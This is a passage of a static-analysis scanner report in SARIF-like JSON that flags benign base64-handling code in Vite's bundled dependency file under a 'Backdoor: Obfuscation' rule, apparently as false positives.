                      "markdown": "`        if (typeof Buffer === 'function') {\n            str =\n                buf instanceof Buffer\n                    ? buf.toString('base64')\n                    : Buffer.from(buf.buffer).toString('base64');\n        }\n        else if (typeof btoa === 'function') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28592,
                  "startColumn": 37,
                  "endLine": 28592,
                  "endColumn": 43,
                  "snippet": {
                    "text": "     */\n    resolve(src, onError) {\n        if (typeof Buffer === 'function') {\n            return Buffer.from(src, 'base64');\n        }\n        else if (typeof atob === 'function') {\n            // On IE 11, atob() can't handle newlines\n",
                    "rendered": {
                      "text": "     */\n    resolve(src, onError) {\n        if (typeof Buffer === 'function') {\n            return Buffer.from(src, 'base64');\n        }\n        else if (typeof atob === 'function') {\n            // On IE 11, atob() can't handle newlines\n",
                      "markdown": "`     */\n    resolve(src, onError) {\n        if (typeof Buffer === 'function') {\n            return Buffer.from(src, 'base64');\n        }\n        else if (typeof atob === 'function') {\n            // On IE 11, atob() can't handle newlines\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20930,
                  "startColumn": 68,
                  "endLine": 20930,
                  "endColumn": 74,
                  "snippet": {
                    "text": "  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$g) {\n",
                    "rendered": {
                      "text": "  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$g) {\n",
                      "markdown": "`  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$g) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20930,
                  "startColumn": 32,
                  "endLine": 20930,
                  "endColumn": 38,
                  "snippet": {
                    "text": "  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$g) {\n",
                    "rendered": {
                      "text": "  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$g) {\n",
                      "markdown": "`  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$g) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20812,
                  "startColumn": 45,
                  "endLine": 20812,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n",
                    "rendered": {
                      "text": "\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n",
                      "markdown": "`\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20812,
                  "startColumn": 24,
                  "endLine": 20812,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n",
                    "rendered": {
                      "text": "\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n",
                      "markdown": "`\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20811,
                  "startColumn": 32,
                  "endLine": 20811,
                  "endColumn": 38,
                  "snippet": {
                    "text": "\t  return new Converter(uri, { encoding: 'uri' });\n\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n",
                    "rendered": {
                      "text": "\t  return new Converter(uri, { encoding: 'uri' });\n\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n",
                      "markdown": "`\t  return new Converter(uri, { encoding: 'uri' });\n\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20773,
                  "startColumn": 18,
                  "endLine": 20773,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\t    encoding = '';\n\t    content = this.toURI();\n\t  } else {\n\t    encoding = ';base64';\n\t    content = this.toBase64();\n\t  }\n\t  data = 'sourceMappingURL=data:application/json;charset=utf-8' + encoding + ',' + content;\n",
                    "rendered": {
                      "text": "\t    encoding = '';\n\t    content = this.toURI();\n\t  } else {\n\t    encoding = ';base64';\n\t    content = this.toBase64();\n\t  }\n\t  data = 'sourceMappingURL=data:application/json;charset=utf-8' + encoding + ',' + content;\n",
                      "markdown": "`\t    encoding = '';\n\t    content = this.toURI();\n\t  } else {\n\t    encoding = ';base64';\n\t    content = this.toBase64();\n\t  }\n\t  data = 'sourceMappingURL=data:application/json;charset=utf-8' + encoding + ',' + content;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20754,
                  "startColumn": 45,
                  "endLine": 20754,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\t  if (typeof json === 'number') {\n\t    throw new TypeError('The json to encode must not be of type number.');\n\t  }\n\t  return new Buffer(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithBtoa() {\n",
                    "rendered": {
                      "text": "\t  if (typeof json === 'number') {\n\t    throw new TypeError('The json to encode must not be of type number.');\n\t  }\n\t  return new Buffer(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithBtoa() {\n",
                      "markdown": "`\t  if (typeof json === 'number') {\n\t    throw new TypeError('The json to encode must not be of type number.');\n\t  }\n\t  return new Buffer(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithBtoa() {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20746,
                  "startColumn": 46,
                  "endLine": 20746,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n\tfunction encodeBase64WithBufferFrom() {\n\t  var json = this.toJSON();\n\t  return Buffer.from(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithNewBuffer() {\n",
                    "rendered": {
                      "text": "\n\tfunction encodeBase64WithBufferFrom() {\n\t  var json = this.toJSON();\n\t  return Buffer.from(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithNewBuffer() {\n",
                      "markdown": "`\n\tfunction encodeBase64WithBufferFrom() {\n\t  var json = this.toJSON();\n\t  return Buffer.from(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithNewBuffer() {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20717,
                  "startColumn": 26,
                  "endLine": 20717,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\t    sm = stripComment(sm);\n\t  }\n\n\t  if (opts.encoding === 'base64') {\n\t    sm = decodeBase64(sm);\n\t  } else if (opts.encoding === 'uri') {\n\t    sm = decodeURIComponent(sm);\n",
                    "rendered": {
                      "text": "\t    sm = stripComment(sm);\n\t  }\n\n\t  if (opts.encoding === 'base64') {\n\t    sm = decodeBase64(sm);\n\t  } else if (opts.encoding === 'uri') {\n\t    sm = decodeURIComponent(sm);\n",
                      "markdown": "`\t    sm = stripComment(sm);\n\t  }\n\n\t  if (opts.encoding === 'base64') {\n\t    sm = decodeBase64(sm);\n\t  } else if (opts.encoding === 'uri') {\n\t    sm = decodeURIComponent(sm);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20647,
                  "startColumn": 116,
                  "endLine": 20647,
                  "endColumn": 122,
                  "snippet": {
                    "text": "\tObject.defineProperty(exports, 'commentRegex', {\n\t  get: function getCommentRegex () {\n\t    // Groups: 1: media type, 2: MIME type, 3: charset, 4: encoding, 5: data.\n\t    return /^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg;\n\t  }\n\t});\n\n",
                    "rendered": {
                      "text": "\tObject.defineProperty(exports, 'commentRegex', {\n\t  get: function getCommentRegex () {\n\t    // Groups: 1: media type, 2: MIME type, 3: charset, 4: encoding, 5: data.\n\t    return /^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg;\n\t  }\n\t});\n\n",
                      "markdown": "`\tObject.defineProperty(exports, 'commentRegex', {\n\t  get: function getCommentRegex () {\n\t    // Groups: 1: media type, 2: MIME type, 3: charset, 4: encoding, 5: data.\n\t    return /^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg;\n\t  }\n\t});\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20638,
                  "startColumn": 13240,
                  "endLine": 20638,
                  "endColumn": 13246,
                  "snippet": {
                    "text": "AHIAYwBlAHIAbwBtAHUAbgBjAHQAaQBvAG4AcwBzAGUAcgB0AHYAbwB5AGkAZQBkAGUAbABlAGMAbwBuAHQAaQBuAGkAbgBzAHQAYQBuAHQAeQBiAHIAZQBhAHIAZQB0AHUAcgBkAGUAYgB1AGcAZwBlAGEAdwBhAGkAdABoAHIAdwBoAGkAbABlAGkAZgBjAGEAdABjAGYAaQBuAGEAbABsAGUAbABzAABB0AkLEAEAAAACAAAAAAQAAEA5AAA=\",\"undefined\"!=typeof Buffer?Buffer.from(E,\"base64\"):Uint8Array.from(atob(E),(A=>A.charCodeAt(0))))).then(WebAssembly.instantiate).then((({exports:A})=>{C=A;}));var E;\n\nvar convertSourceMap$1 = {};\n\n(function (exports) {\n\n\tObject.defineProperty(exports, 'commentRegex', {\n\t  get: function getCommentRegex () {\n\t    // Groups: 1: media type, 2: MIME t",
                    "rendered": {
                      "text": "AHIAYwBlAHIAbwBtAHUAbgBjAHQAaQBvAG4AcwBzAGUAcgB0AHYAbwB5AGkAZQBkAGUAbABlAGMAbwBuAHQAaQBuAGkAbgBzAHQAYQBuAHQAeQBiAHIAZQBhAHIAZQB0AHUAcgBkAGUAYgB1AGcAZwBlAGEAdwBhAGkAdABoAHIAdwBoAGkAbABlAGkAZgBjAGEAdABjAGYAaQBuAGEAbABsAGUAbABzAABB0AkLEAEAAAACAAAAAAQAAEA5AAA=\",\"undefined\"!=typeof Buffer?Buffer.from(E,\"base64\"):Uint8Array.from(atob(E),(A=>A.charCodeAt(0))))).then(WebAssembly.instantiate).then((({exports:A})=>{C=A;}));var E;\n\nvar convertSourceMap$1 = {};\n\n(function (exports) {\n\n\tObject.defineProperty(exports, 'commentRegex', {\n\t  get: function getCommentRegex () {\n\t    // Groups: 1: media type, 2: MIME t",
                      "markdown": "`AHIAYwBlAHIAbwBtAHUAbgBjAHQAaQBvAG4AcwBzAGUAcgB0AHYAbwB5AGkAZQBkAGUAbABlAGMAbwBuAHQAaQBuAGkAbgBzAHQAYQBuAHQAeQBiAHIAZQBhAHIAZQB0AHUAcgBkAGUAYgB1AGcAZwBlAGEAdwBhAGkAdABoAHIAdwBoAGkAbABlAGkAZgBjAGEAdABjAGYAaQBuAGEAbABsAGUAbABzAABB0AkLEAEAAAACAAAAAAQAAEA5AAA=\",\"undefined\"!=typeof Buffer?Buffer.from(E,\"base64\"):Uint8Array.from(atob(E),(A=>A.charCodeAt(0))))).then(WebAssembly.instantiate).then((({exports:A})=>{C=A;}));var E;\n\nvar convertSourceMap$1 = {};\n\n(function (exports) {\n\n\tObject.defineProperty(exports, 'commentRegex', {\n\t  get: function getCommentRegex () {\n\t    // Groups: 1: media type, 2: MIME t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20625,
                  "startColumn": 50,
                  "endLine": 20625,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n    },\n",
                    "rendered": {
                      "text": "        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n    },\n",
                      "markdown": "`        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n    },\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20625,
                  "startColumn": 22,
                  "endLine": 20625,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n    },\n",
                    "rendered": {
                      "text": "        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n    },\n",
                      "markdown": "`        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n    },\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20624,
                  "startColumn": 12,
                  "endLine": 20624,
                  "endColumn": 18,
                  "snippet": {
                    "text": "          `data URI with non-JavaScript mime type is not supported. If you're using legacy JavaScript MIME types (such as 'application/javascript'), please use 'text/javascript' instead.`\n        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n",
                    "rendered": {
                      "text": "          `data URI with non-JavaScript mime type is not supported. If you're using legacy JavaScript MIME types (such as 'application/javascript'), please use 'text/javascript' instead.`\n        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n",
                      "markdown": "`          `data URI with non-JavaScript mime type is not supported. If you're using legacy JavaScript MIME types (such as 'application/javascript'), please use 'text/javascript' instead.`\n        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20597,
                  "startColumn": 18,
                  "endLine": 20597,
                  "endColumn": 24,
                  "snippet": {
                    "text": "}\n\nconst dataUriRE = /^([^/]+\\/[^;,]+)(;base64)?,([\\s\\S]*)$/;\nconst base64RE = /base64/i;\nconst dataUriPrefix = `\\0/@data-uri/`;\nfunction dataURIPlugin() {\n  let resolved;\n",
                    "rendered": {
                      "text": "}\n\nconst dataUriRE = /^([^/]+\\/[^;,]+)(;base64)?,([\\s\\S]*)$/;\nconst base64RE = /base64/i;\nconst dataUriPrefix = `\\0/@data-uri/`;\nfunction dataURIPlugin() {\n  let resolved;\n",
                      "markdown": "`}\n\nconst dataUriRE = /^([^/]+\\/[^;,]+)(;base64)?,([\\s\\S]*)$/;\nconst base64RE = /base64/i;\nconst dataUriPrefix = `\\0/@data-uri/`;\nfunction dataURIPlugin() {\n  let resolved;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20596,
                  "startColumn": 37,
                  "endLine": 20596,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  }\n}\n\nconst dataUriRE = /^([^/]+\\/[^;,]+)(;base64)?,([\\s\\S]*)$/;\nconst base64RE = /base64/i;\nconst dataUriPrefix = `\\0/@data-uri/`;\nfunction dataURIPlugin() {\n",
                    "rendered": {
                      "text": "  }\n}\n\nconst dataUriRE = /^([^/]+\\/[^;,]+)(;base64)?,([\\s\\S]*)$/;\nconst base64RE = /base64/i;\nconst dataUriPrefix = `\\0/@data-uri/`;\nfunction dataURIPlugin() {\n",
                      "markdown": "`  }\n}\n\nconst dataUriRE = /^([^/]+\\/[^;,]+)(;base64)?,([\\s\\S]*)$/;\nconst base64RE = /base64/i;\nconst dataUriPrefix = `\\0/@data-uri/`;\nfunction dataURIPlugin() {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20462,
                  "startColumn": 58,
                  "endLine": 20462,
                  "endColumn": 64,
                  "snippet": {
                    "text": "function svgToDataURL(content) {\n  const stringContent = content.toString();\n  if (stringContent.includes(\"<text\") || stringContent.includes(\"<foreignObject\") || nestedQuotesRE.test(stringContent)) {\n    return `data:image/svg+xml;base64,${content.toString(\"base64\")}`;\n  } else {\n    return \"data:image/svg+xml,\" + stringContent.trim().replaceAll(/>\\s+</g, \"><\").replaceAll('\"', \"'\").replaceAll(\"%\", \"%25\").replaceAll(\"#\", \"%23\").replaceAll(\"<\", \"%3c\").replaceAll(\">\", \"%3e\").replaceAll(/\\s+/g, \"%20\");\n  }\n",
                    "rendered": {
                      "text": "function svgToDataURL(content) {\n  const stringContent = content.toString();\n  if (stringContent.includes(\"<text\") || stringContent.includes(\"<foreignObject\") || nestedQuotesRE.test(stringContent)) {\n    return `data:image/svg+xml;base64,${content.toString(\"base64\")}`;\n  } else {\n    return \"data:image/svg+xml,\" + stringContent.trim().replaceAll(/>\\s+</g, \"><\").replaceAll('\"', \"'\").replaceAll(\"%\", \"%25\").replaceAll(\"#\", \"%23\").replaceAll(\"<\", \"%3c\").replaceAll(\">\", \"%3e\").replaceAll(/\\s+/g, \"%20\");\n  }\n",
                      "markdown": "`function svgToDataURL(content) {\n  const stringContent = content.toString();\n  if (stringContent.includes(\"<text\") || stringContent.includes(\"<foreignObject\") || nestedQuotesRE.test(stringContent)) {\n    return `data:image/svg+xml;base64,${content.toString(\"base64\")}`;\n  } else {\n    return \"data:image/svg+xml,\" + stringContent.trim().replaceAll(/>\\s+</g, \"><\").replaceAll('\"', \"'\").replaceAll(\"%\", \"%25\").replaceAll(\"#\", \"%23\").replaceAll(\"<\", \"%3c\").replaceAll(\">\", \"%3e\").replaceAll(/\\s+/g, \"%20\");\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20462,
                  "startColumn": 31,
                  "endLine": 20462,
                  "endColumn": 37,
                  "snippet": {
                    "text": "function svgToDataURL(content) {\n  const stringContent = content.toString();\n  if (stringContent.includes(\"<text\") || stringContent.includes(\"<foreignObject\") || nestedQuotesRE.test(stringContent)) {\n    return `data:image/svg+xml;base64,${content.toString(\"base64\")}`;\n  } else {\n    return \"data:image/svg+xml,\" + stringContent.trim().replaceAll(/>\\s+</g, \"><\").replaceAll('\"', \"'\").replaceAll(\"%\", \"%25\").replaceAll(\"#\", \"%23\").replaceAll(\"<\", \"%3c\").replaceAll(\">\", \"%3e\").replaceAll(/\\s+/g, \"%20\");\n  }\n",
                    "rendered": {
                      "text": "function svgToDataURL(content) {\n  const stringContent = content.toString();\n  if (stringContent.includes(\"<text\") || stringContent.includes(\"<foreignObject\") || nestedQuotesRE.test(stringContent)) {\n    return `data:image/svg+xml;base64,${content.toString(\"base64\")}`;\n  } else {\n    return \"data:image/svg+xml,\" + stringContent.trim().replaceAll(/>\\s+</g, \"><\").replaceAll('\"', \"'\").replaceAll(\"%\", \"%25\").replaceAll(\"#\", \"%23\").replaceAll(\"<\", \"%3c\").replaceAll(\">\", \"%3e\").replaceAll(/\\s+/g, \"%20\");\n  }\n",
                      "markdown": "`function svgToDataURL(content) {\n  const stringContent = content.toString();\n  if (stringContent.includes(\"<text\") || stringContent.includes(\"<foreignObject\") || nestedQuotesRE.test(stringContent)) {\n    return `data:image/svg+xml;base64,${content.toString(\"base64\")}`;\n  } else {\n    return \"data:image/svg+xml,\" + stringContent.trim().replaceAll(/>\\s+</g, \"><\").replaceAll('\"', \"'\").replaceAll(\"%\", \"%25\").replaceAll(\"#\", \"%23\").replaceAll(\"<\", \"%3c\").replaceAll(\">\", \"%3e\").replaceAll(/\\s+/g, \"%20\");\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
